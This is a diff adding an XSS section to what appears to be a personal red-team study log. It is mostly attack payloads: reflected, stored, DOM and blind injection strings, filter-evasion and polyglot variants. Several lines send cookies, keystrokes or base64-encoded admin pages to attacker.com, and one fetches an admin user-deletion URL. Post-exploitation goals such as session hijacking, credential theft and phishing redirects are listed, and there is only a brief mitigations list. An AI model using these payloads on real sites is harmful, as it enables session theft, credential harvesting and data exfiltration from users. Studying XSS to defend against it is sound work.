@@ -840,3 +840,121 @@ Web Application Firewall (WAF) rules
 ◽ Advanced Persistence Techniques
 
 OPERATIONAL NOTES: SSRF represents one of the most powerful web vulnerabilities for Red Team operations, enabling complete bypass of network perimeter defenses and direct access to internal infrastructure and cloud environments.
+
+# Red Monster Journey 🐲 
+## Cross-Site Scripting (XSS) Mastery
+
+### 🎯 MODULE COMPLETION: XSS ATTACKS
+**Status:** Mastered ✅
+**Red Team Application:** Client-Side Compromise & Session Hijacking
+
+### 🔴 XSS TRADECRAFT DOCUMENTATION
+
+#### 📊 VULNERABILITY OVERVIEW
+XSS vulnerabilities allow attackers to inject and execute malicious JavaScript in victims' browsers, enabling session theft, credential harvesting, and client-side attacks.
+
+#### 🎲 EXPLOITATION TECHNIQUES MASTERED
+
+##### XSS TYPES & DETECTION
+```http
+# Reflected XSS (Immediate Execution)
+?search=<script>alert(1)</script>
+?q=<img src=x onerror=alert(1)>
+
+# Stored XSS (Persistent)
+Comments: <script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
+User Profiles: <svg onload=alert(1)>
+
+# DOM-Based XSS (Client-Side)
+document.write(location.hash.substring(1))
+eval(URLSearchParams.get('payload'))
+
+# Blind XSS (Delayed)
+Support Forms: <script>fetch('http://webhook.site/ID')</script>
+PAYLOAD INTENTIONS & DEVELOPMENT
+javascript
+// Proof of Concept
+<script>alert('XSS')</script>
+<svg onload=alert(1)>
+
+// Session Stealing
+<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
+
+// Key Logging  
+<script>document.onkeypress=function(e){fetch('http://attacker.com/log?key='+e.key)}</script>
+
+// Business Logic Abuse
+<script>fetch('/admin/delete-user/123')</script>
+FILTER EVASION TECHNIQUES
+javascript
+// Case Manipulation
+<ScRiPt>alert(1)</sCrIpT>
+
+// Encoding
+&lt;script&gt;alert(1)&lt;/script&gt;
+%3Cscript%3Ealert(1)%3C/script%3E
+
+// Alternative Tags
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+
+// Polyglot Payloads
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//
+🛠️ RED TEAM OPERATIONAL PROCEDURES
+RECONNAISSANCE PHASE
+Parameter enumeration in URLs, forms, and API endpoints
+
+Identification of data reflection points in HTTP responses
+
+Analysis of client-side JavaScript for DOM-based vulnerabilities
+
+EXPLOITATION PHASE
+Reflected XSS Attacks
+
+http
+Malicious URLs: http://target.com/search?q=<script>alert(1)</script>
+Social engineering campaigns
+Stored XSS Deployment
+
+javascript
+// Comment sections, user profiles, forum posts
+<script>setInterval(()=>{fetch('http://attacker.com/steal?cookie='+document.cookie)},10000)</script>
+Blind XSS for Internal Access
+
+javascript
+// Target admin panels and internal applications
+<script>fetch('/admin').then(r=>r.text()).then(d=>{fetch('http://attacker.com/leak?data='+btoa(d))})</script>
+POST-EXPLOITATION
+Session cookie harvesting and hijacking
+
+Credential theft through fake login forms
+
+Client-side keylogging and data exfiltration
+
+Redirection to phishing/malware sites
+
+📈 RISK ASSESSMENT
+Impact: HIGH (Session compromise, credential theft)
+
+Detection Difficulty: Medium (Client-side execution)
+
+Exploitation Complexity: Low-Medium
+
+🔧 MITIGATIONS UNDERSTOOD
+Input validation and output encoding
+
+Content Security Policy (CSP) implementation
+
+HTTPOnly cookies for session protection
+
+WAF rules and XSS filters
+
+🚀 PROGRESSION IN RED TEAM SKILL MATRIX
+✅ Network Security
+✅ Web Application Security
+✅ Client-Side Attacks ← XSS ADDED
+◽ Social Engineering
+◽ Advanced Persistence Techniques
+
+OPERATIONAL NOTES: XSS remains one of the most prevalent web vulnerabilities, providing direct client-side compromise capabilities. Blind XSS is particularly valuable for targeting internal applications and administrative interfaces through stored payloads.
